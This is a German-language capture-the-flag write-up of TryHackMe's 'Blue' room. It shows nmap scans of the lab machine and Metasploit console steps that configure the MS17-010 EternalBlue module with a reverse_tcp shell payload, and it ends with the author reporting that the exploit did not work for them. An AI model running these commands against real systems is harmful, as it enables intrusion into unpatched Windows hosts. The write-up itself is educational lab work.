---
title: "THM Blue Writeup"
date: 2023-10-01
tags: [writeup, ctf, tryhackme]
description: "Scannen eines exponierten SMB-Dienstes und Nutzen des MS17-010-EternalBlue-Exploits, um in TryHackMes Blue-Room Fuß zu fassen."
---

## Setup

Um diese Challenge zu starten, müssen wir uns zuerst mit dem tryhackme-VPN-Server verbinden. Weitere Informationen dazu findest du auf der [Access](https://tryhackme.com/access)-Seite.

Ich verwende openvpn, um mich mit dem Server zu verbinden. Hier ist der Befehl:

```console
$ sudo openvpn --config NovusEdge.ovpn
```

## Enumeration

Sobald die Machine gestartet ist, beginnen wir mit dem Scannen des Netzwerks: 

```console
$ sudo nmap -sS -vv MACHINE_IP
...
Initiating SYN Stealth Scan at 15:45
Scanning MACHINE_IP [1000 ports]
Discovered open port 135/tcp on MACHINE_IP
Discovered open port 3389/tcp on MACHINE_IP
Discovered open port 139/tcp on MACHINE_IP
...
PORT      STATE SERVICE       REASON
135/tcp   open  msrpc         syn-ack ttl 127
139/tcp   open  netbios-ssn   syn-ack ttl 127
445/tcp   open  microsoft-ds  syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127
49152/tcp open  unknown       syn-ack ttl 127
49153/tcp open  unknown       syn-ack ttl 127
49154/tcp open  unknown       syn-ack ttl 127
49158/tcp open  unknown       syn-ack ttl 127
49160/tcp open  unknown       syn-ack ttl 127

...
```

Aus diesem einfachen Scan erhalten wir also die Antwort auf die erste Frage im Room:

> How many ports are open with a port number under 1000?
> > 3

Wir können die Dienstversionen genauer überprüfen, indem wir einen Service-Scan auf den Ports `135`, `139` und `445` ausführen:

```console
$ nmap -sV -vv -p135,139,445 MACHINE_IP 
...

PORT    STATE SERVICE      REASON  VERSION
135/tcp open  msrpc        syn-ack Microsoft Windows RPC
139/tcp open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

...
```

Nichts Interessantes... Nun, die Antwort auf die nächste Frage ist der Exploit-Code, der zum `Eternal Blue`-Exploit gehört. Wie ich zu diesem Schluss gekommen bin? Um ehrlich zu sein, springt es einem auf der Webseite förmlich ins Auge, wenn man sich den Room auf Tryhackme anschaut: 

![](/assets/img/writeup_assets/blue/blue-room-top.png)

Eine kurze, einfache Suche verrät uns den alternativen Namen des Exploits:

![](/assets/img/writeup_assets/blue/eblue-search.png)

Damit haben wir die Antwort auf die nächste Frage:

> What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
> > MS17-010

## Zugriff erlangen

Mit dem Wissen aus der Enumeration-Phase bewaffnet, versuchen wir nun, die gegebene Machine zu exploiten.

Es gibt zwei Wege, das zu tun: mit Metasploit und ohne. Wir versuchen es zunächst mit Metasploit, aber ich werde versuchen, noch einen Abschnitt einzubauen, in dem ich es ohne Metasploit angehe.

Nachdem wir `msfconsole` gestartet haben, können wir nach verfügbaren Exploits suchen:

```console
$ sudo msfconsole -q
msf6 > search eternal blue

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution                 
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection                                                                                  
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
```

Der gesuchte ist der erste, `exploit/windows/smb/ms17_010_eternalblue`. Damit haben wir die Antwort auf die erste Frage in diesem Abschnitt:

> Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)
> > exploit/windows/smb/ms17_010_eternalblue

Wir können uns die Optionen des ausgewählten Moduls wie folgt ansehen:

```console
msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target ma
                                             chines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machin
                                             es.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.80.0.96       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target
```

Wir müssen einige davon setzen, wobei die erste und wichtigste `RHOSTS` ist:

```console
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS  MACHINE_IP 
RHOSTS => MACHINE_IP
```

Das ist die Antwort auf die zweite Frage:

> Show options and set the one required value. What is the name of this value? (All caps for submission)
> > RHOSTS

Als Nächstes setzen wir das Payload für den Exploit. Ich werde `windows/x64/shell/reverse_tcp` verwenden, wie in den Anweisungen des Rooms angegeben:

```console
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
```


Und jetzt führen wir einfach den Exploit aus und schauen zu, wie die Magie geschieht!
> Note that if this does not work, just reboot the VM by terminating it and starting it again, and then running this exploit after updating RHOSTS

```console
```

#### Tja, der Exploit funktioniert bei mir überhaupt nicht, also werde ich dieses Writeup aktualisieren, sobald es klappt. Bis dann!


Link to the room: https://tryhackme.com/room/blue

